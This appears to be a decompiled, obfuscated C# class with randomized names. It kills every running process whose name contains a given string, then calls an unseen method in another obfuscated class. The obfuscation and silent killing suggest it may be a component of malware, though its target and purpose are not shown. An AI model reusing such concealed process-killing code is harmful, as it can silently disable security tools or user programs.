using System;
using System.Diagnostics;

namespace nZBhTHSmQawuU;

public sealed class sLAgApvXPjsH
{
	public static bool XoIbMbqbhmZKAlBJ(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void prgIyYijHOOMW(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (XoIbMbqbhmZKAlBJ(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					WzLdBSYJOokD.LzxBRCOByFkfxccW();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
